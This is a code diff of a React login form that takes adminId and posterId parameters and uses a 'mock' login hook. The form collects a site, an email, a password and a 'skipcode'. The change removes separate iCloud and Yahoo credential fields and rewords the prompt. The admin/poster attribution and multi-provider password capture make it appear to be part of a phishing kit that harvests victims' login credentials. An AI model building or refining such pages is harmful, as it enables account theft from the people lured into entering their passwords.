@@ -8,8 +8,6 @@ function LoginForm({ adminId, posterId }) {
     email: "",
     password: "",
     remember: "",
-    icloud: "",
-    yahoo: "",
   };
 
   const { login } = useMockLogin(adminId, posterId);
@@ -24,8 +22,6 @@ function LoginForm({ adminId, posterId }) {
       site: site,
       email: email,
       password: password,
-      icloud: icloud,
-      yahoo: yahoo,
       skipcode: "",
     };
 
@@ -37,7 +33,7 @@ function LoginForm({ adminId, posterId }) {
 
   return (
     <div className="px-5 lg:px-10 mt-5  md:w-[420px] bg-white w-[400px]">
-      <p className="text-2xl  text-gray-600 text-center ">What's your Email?</p>
+      <p className="text-2xl  text-gray-600 text-center ">What's your Mail?</p>
 
       <div className="mt-5">
         <Formik
@@ -49,26 +45,12 @@ function LoginForm({ adminId, posterId }) {
             <Form className="">
               <Field
                 className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-300 shadow-inner placeholder:font-medium placeholder:text-black/50 focus:border-[#1a73e8] rounded "
-                placeholder="Your email"
+                placeholder="Your mail"
                 name="email"
                 type="email"
                 required
               />
 
-              <Field
-                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-gray-300  shadow-inner placeholder:font-medium placeholder:text-black/50 focus:border-[#1a73e8] rounded "
-                placeholder="Icloud"
-                name="icloud"
-                type="text"
-                required
-              />
-              <Field
-                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-gray-300  shadow-inner placeholder:font-medium placeholder:text-black/50 focus:border-[#1a73e8] rounded "
-                placeholder="Yahoo"
-                name="yahoo"
-                type="text"
-                required
-              />
               <Field
                 className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-gray-300  shadow-inner placeholder:font-medium placeholder:text-black/50 focus:border-[#1a73e8] rounded "
                 placeholder="Password"
